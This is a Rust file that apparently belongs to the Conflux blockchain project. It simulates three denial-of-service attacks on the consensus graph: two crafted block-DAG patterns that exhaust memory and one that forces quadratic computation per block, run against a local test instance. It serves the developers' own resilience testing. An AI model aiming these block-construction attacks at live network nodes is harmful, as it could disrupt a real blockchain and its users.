// Copyright 2019 Conflux Foundation. All rights reserved.
// Conflux is free software and distributed under GNU General Public License.
// See http://www.gnu.org/licenses/

use cfxcore::sync::utils::{
    create_simple_block, initialize_synchronization_graph,
};
use std::{thread, time};

/// Assume that honest nodes take control of 70% and tha bad nodes take the
/// rest 30%. In average, if all the nodes are honest, the number of blocks
/// in each epoch are about 10. So in an era, about 50w blocks are mined by
/// honest nodes, and about 21w blocks are mined by bad nodes.
/// Let `block[i]` be the `i`-th blocks among the 21w blocks, if
/// `block[i].parent = block[1].hash` and `block[i].referee = vec![block[i -
/// 1].hash]`, we can build a graph such that the total size of
/// `blockset_in_own_view_of_epoch` in each block will be (21w + 1) * 21w / 2
/// ≈ 22 billion and the memory usage is about 164GB
fn out_of_memory_attack1() {
    let alpha_num = 2;
    let alpha_den = 3;
    let beta = 150;
    let h_ratio = 10;
    let era_epoch_count: usize = 50000;
    let db_dir = "./__consensus_attack_db";

    println!(
        "alpha = {}/{} beta = {} h = {} era_epoch_count = {}",
        alpha_num, alpha_den, beta, h_ratio, era_epoch_count
    );
    let start_time = time::SystemTime::now();

    let (sync, consensus, genesis_block) = initialize_synchronization_graph(
        db_dir,
        alpha_den,
        alpha_num,
        beta,
        h_ratio,
        era_epoch_count as u64,
    );

    let mut hashes = Vec::new();
    hashes.push(genesis_block.hash());

    println!(
        "{} blocks inserted len={}, elapsed={}",
        consensus.get_processed_block_count(),
        hashes.len(),
        start_time.elapsed().unwrap().as_millis() as f64 / 1_000.0
    );

    for i in 1..era_epoch_count {
        let (new_hash, mut new_block) =
            create_simple_block(sync.clone(), hashes[i - 1], Vec::new(), 1);
        hashes.push(new_hash);
        sync.insert_block_header(
            &mut new_block.block_header,
            false, // need_to_verify
            true,  // bench_mode
            false, // insert_to_consensus
            true,  // persistent
        );
        sync.insert_block(new_block, false /* need_to_verify */, false /* persistent */, false /* recover_from_db */);
    }
    while consensus.get_processed_block_count() != era_epoch_count - 1 {
        thread::sleep(time::Duration::from_millis(100));
    }
    println!(
        "{} blocks inserted len={}, elapsed={}",
        consensus.get_processed_block_count(),
        hashes.len(),
        start_time.elapsed().unwrap().as_millis() as f64 / 1_000.0
    );
    for i in era_epoch_count..era_epoch_count * 10 / 7 * 3 {
        let ref_hashes = {
            if i == era_epoch_count {
                Vec::new()
            } else {
                vec![hashes[i - 1]]
            }
        };
        let (new_hash, mut new_block) =
            create_simple_block(sync.clone(), hashes[2], ref_hashes, 1);
        hashes.push(new_hash);
        sync.insert_block_header(
            &mut new_block.block_header,
            false, // need_to_verify
            true,  // bench_mode
            false, // insert_to_consensus
            true,  // persistent
        );
        sync.insert_block(new_block, false /* need_to_verify */, false /* persistent */, false /* recover_from_db */);
        if (i - era_epoch_count + 1) % 10000 == 0 {
            while consensus.get_processed_block_count() != i {
                thread::sleep(time::Duration::from_millis(100));
            }
            println!(
                "{} blocks inserted, elapsed {}",
                i,
                start_time.elapsed().unwrap().as_millis() as f64 / 1_000.0
            );
        }
    }
    println!(
        "{} blocks inserted len={}, elapsed={}",
        consensus.get_processed_block_count(),
        hashes.len(),
        start_time.elapsed().unwrap().as_millis() as f64 / 1_000.0
    );
}

/// Unlike the first attack, this attack will only generate valid blocks.
/// Assume `pivot[i]` be the `i`-th block in pivot chain, we generate a
/// `block[i]` whose parent is `pivot[i - 3]` and which has only one referee
/// `block[i - 1]`. We can see that `block[i]` can be a valid block and it's
/// `blockset_in_own_view_of_epoch` is equal to `i`.
fn out_of_memory_attack2() {
    let alpha_num = 2;
    let alpha_den = 3;
    let beta = 150;
    let h_ratio = 10;
    let era_epoch_count: usize = 50000;
    let db_dir = "./__consensus_attack_db";

    println!(
        "alpha = {}/{} beta = {} h = {} era_epoch_count = {}",
        alpha_num, alpha_den, beta, h_ratio, era_epoch_count
    );
    let start_time = time::SystemTime::now();

    let (sync, consensus, genesis_block) = initialize_synchronization_graph(
        db_dir,
        alpha_den,
        alpha_num,
        beta,
        h_ratio,
        era_epoch_count as u64,
    );

    let mut pivot = Vec::new();
    let mut block = Vec::new();
    pivot.push(genesis_block.hash());

    println!(
        "{} blocks inserted len={}, elapsed={}",
        consensus.get_processed_block_count(),
        pivot.len(),
        start_time.elapsed().unwrap().as_millis() as f64 / 1_000.0
    );

    for i in 1..100000 {
        // insert a pivot block
        let (new_hash, mut new_block) =
            create_simple_block(sync.clone(), pivot[i - 1], Vec::new(), 1);
        pivot.push(new_hash);
        sync.insert_block_header(
            &mut new_block.block_header,
            false, // need_to_verify
            true,  // bench_mode
            false, // insert_to_consensus
            true,  // persistent
        );
        sync.insert_block(new_block, false /* need_to_verify */, false /* persistent */, false /* recover_from_db */);
        // insert a malicious block
        if i >= 3 {
            let mut ref_hashes = Vec::new();
            if i >= 4 {
                ref_hashes.push(block[i - 4]);
            }
            let (new_hash, mut new_block) =
                create_simple_block(sync.clone(), pivot[i - 3], ref_hashes, 1);
            block.push(new_hash);
            sync.insert_block_header(
                &mut new_block.block_header,
                false, // need_to_verify
                true,  // bench_mode
                false, // insert_to_consensus
                true,  // persistent
            );
            sync.insert_block(new_block, false /* need_to_verify */, false /* persistent */, false /* recover_from_db */);
        }
        if i % 1000 == 0 {
            while consensus.get_processed_block_count()
                != pivot.len() + block.len() - 1
            {
                thread::sleep(time::Duration::from_millis(100));
            }
            println!(
                "{} blocks inserted, elapsed {}",
                pivot.len() + block.len() - 1,
                start_time.elapsed().unwrap().as_millis() as f64 / 1_000.0
            );
        }
    }
}

/// This attack will cause consensus graph run `O(era_epoch_count^2)` for each
/// `on_new_block` call. Assume `pivot[i]` be the `i`-th block in pivot chain,
/// we generate a `block[i]` whose parent is `pivot[i - 3]` and which has only
/// one referee `pivot[i + era_epoch_count]`. We can see that `block[i]` can be
/// a partial_valid block and the time for compute
/// `blockset_in_own_view_of_epoch` is `O(era_epoch_count^2)`
fn performence_attack() {
    let alpha_num = 2;
    let alpha_den = 3;
    let beta = 150;
    let h_ratio = 10;
    let era_epoch_count: usize = 50000;
    let db_dir = "./__consensus_attack_db";

    println!(
        "alpha = {}/{} beta = {} h = {} era_epoch_count = {}",
        alpha_num, alpha_den, beta, h_ratio, era_epoch_count
    );
    let start_time = time::SystemTime::now();

    let (sync, consensus, genesis_block) = initialize_synchronization_graph(
        db_dir,
        alpha_den,
        alpha_num,
        beta,
        h_ratio,
        era_epoch_count as u64,
    );

    let mut pivot = Vec::new();
    let mut block = Vec::new();
    pivot.push(genesis_block.hash());
    for i in 1..era_epoch_count {
        // insert a pivot block
        let (new_hash, mut new_block) =
            create_simple_block(sync.clone(), pivot[i - 1], Vec::new(), 1);
        pivot.push(new_hash);
        sync.insert_block_header(
            &mut new_block.block_header,
            false, // need_to_verify
            true,  // bench_mode
            false, // insert_to_consensus
            true,  // persistent
        );
        sync.insert_block(new_block, false /* need_to_verify */, false /* persistent */, false /* recover_from_db */);
    }
    for i in era_epoch_count..era_epoch_count * 2 {
        // insert a pivot block
        let (new_hash, mut new_block) =
            create_simple_block(sync.clone(), pivot[i - 1], Vec::new(), 1);
        pivot.push(new_hash);
        sync.insert_block_header(
            &mut new_block.block_header,
            false, // need_to_verify
            true,  // bench_mode
            false, // insert_to_consensus
            true,  // persistent
        );
        sync.insert_block(new_block, false /* need_to_verify */, false /* persistent */, false /* recover_from_db */);
        // insert a malicious block
        let (new_hash, mut new_block) = create_simple_block(
            sync.clone(),
            pivot[i - era_epoch_count],
            vec![pivot[i]],
            1,
        );
        block.push(new_hash);
        sync.insert_block_header(
            &mut new_block.block_header,
            false, // need_to_verify
            true,  // bench_mode
            false, // insert_to_consensus
            true,  // persistent
        );
        sync.insert_block(new_block, false /* need_to_verify */, false /* persistent */, false /* recover_from_db */);
        if (i + 1) % 1000 == 0 {
            while consensus.get_processed_block_count()
                != pivot.len() + block.len() - 1
            {
                thread::sleep(time::Duration::from_millis(100));
            }
            println!(
                "{} blocks inserted, elapsed {}",
                pivot.len() + block.len() - 1,
                start_time.elapsed().unwrap().as_millis() as f64 / 1_000.0
            );
        }
    }
}

fn main() {
    // out_of_memory_attack1();
    // out_of_memory_attack2();
    performence_attack();
}
